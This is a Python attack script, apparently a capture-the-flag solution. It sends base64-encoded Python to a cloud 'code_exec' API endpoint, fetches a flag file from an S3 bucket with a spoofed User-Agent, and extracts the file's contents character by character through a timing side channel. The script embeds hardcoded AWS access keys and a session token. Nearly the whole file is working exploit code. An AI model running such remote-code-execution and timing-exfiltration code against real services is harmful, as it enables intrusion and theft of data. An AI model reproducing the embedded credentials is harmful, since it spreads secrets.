import base64
import requests
import time
from aws_requests_auth.aws_auth import AWSRequestsAuth

auth = AWSRequestsAuth(aws_access_key="ASIARYWSMSYIOLOPQDID",
                       aws_secret_access_key="fzVE7H2+LqCvSNDLNzb1qS7oNEgVmwUm6T4ykuhq",
                       aws_token="IQoJb3JpZ2luX2VjELf//////////wEaDGlsLWNlbnRyYWwtMSJIMEYCIQDbv8K6aDIK9hgYAX96Cy3KWnf1nV6CK4zSOHtFYxRSzwIhAO6mXPFjyZd+6TRZsMIwtXohzOCURYNPdJqLl/uzdiyQKrUCCCQQABoMMTIxNzc0MDUyODgwIgwgxonHTHHAlDodO9wqkgJx7w+jK4uqQZAWDUqG7wlZ0IGc+cypxmsZ2PuPd1TWtwFF4Vv0MaCadKDdi49HdvpTY7KA+FQDtpJWBk2gmHkf9xpvMK4F5py+qG0lY7UalW/0OBGBfU2xb7YGzxmZF9w2TpqAj7HBEP07bhqST0ViU2ODIvf+5NMbDHYnhoOsYk2E1OPadWGQrakz6poU2+kTlvpA0bNCpR8sVZ6nz7FddcgJJmREMSdYMr+WJ3L3GNbiXihQT6Bzf1+IyItX7pgfhD2xpRSTFuePD9PeWMr3ASGt8ZSaOQDNBORnDUytLPGAYwBFdQZpl30pBnHA8vUZFFiRDdNNMs/HmHBH1dpN+yVtCNn/QnibHS2z6kA+n2OsMIOjzNMGOpwBypSEq9f7dXcHc58gHPJwbsnXkYmhe3joODue97MM0EHT9q1Ts6mkhrhJkvcIFPIlIwa6dYuWLiKxkbh80fSCOYuEHmzqkrynYFofo/BOxZ93fx1HlLeZji+uXDVLq8Z4kVuUu5DMkOKqvoFFPtZmFneh8sbN3NBvBPxgFD+KoLEuLJJzmYmg0zLO/cCE8VaNNVrVtIGQGJw6FVw1",
                       aws_host='l8ssyaz69f.execute-api.us-east-1.amazonaws.com',
                       aws_region='us-east-1',
                       aws_service='execute-api')

url = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"

def test_cmd(pos, char):
    code = f"""
import urllib.request
import time

req = urllib.request.Request(
    'http://s3.us-east-1.amazonaws.com/userd8a2f72fe43094e8/flag.txt',
    headers={{'User-Agent': '[cloudfront.net/docs.html]'}}
)
try:
    response = urllib.request.urlopen(req, timeout=5)
    val = response.read().decode('utf-8')
    c = chr({ord(char)})
    if len(val) > {pos} and val[{pos}] == c:
        time.sleep(2.0)
except Exception as e:
    pass
"""
    encoded_code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
    start = time.time()
    try:
        requests.post(url, json={"code": encoded_code}, auth=auth, timeout=5)
    except:
        pass
    elapsed = time.time() - start
    return elapsed > 1.5

def extract_flag():
    print("Testing if UA works...")
    # First test if it works at all
    code = f"""
import urllib.request
import time

req = urllib.request.Request(
    'http://s3.us-east-1.amazonaws.com/userd8a2f72fe43094e8/flag.txt',
    headers={{'User-Agent': '[cloudfront.net/docs.html]'}}
)
try:
    response = urllib.request.urlopen(req, timeout=5)
    val = response.read().decode('utf-8')
    time.sleep(2.0)
except Exception as e:
    pass
"""
    encoded_code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
    start = time.time()
    try:
        requests.post(url, json={"code": encoded_code}, auth=auth, timeout=5)
    except:
        pass
    elapsed = time.time() - start
    if elapsed < 1.5:
        print("Failed to fetch flag. UA might be wrong or endpoint timeout.")
        return
        
    print("UA works! Extracting flag length...")
    code = f"""
import urllib.request
import time

req = urllib.request.Request(
    'http://s3.us-east-1.amazonaws.com/userd8a2f72fe43094e8/flag.txt',
    headers={{'User-Agent': '[cloudfront.net/docs.html]'}}
)
try:
    response = urllib.request.urlopen(req, timeout=5)
    val = response.read().decode('utf-8')
    time.sleep(len(val) / 10.0)
except Exception as e:
    pass
"""
    encoded_code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
    start = time.time()
    try:
        requests.post(url, json={"code": encoded_code}, auth=auth, timeout=20)
    except:
        pass
    elapsed = time.time() - start
    length = int(round((elapsed) * 10))
    print(f"Estimated length: {length}")
    
    res = ""
    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_}{"
    for pos in range(length):
        found = False
        for c in charset:
            if test_cmd(pos, c):
                res += c
                found = True
                print(f"Progress: {res}", flush=True)
                break
        if not found:
            res += "?"
    print("FLAG:", res)

extract_flag()
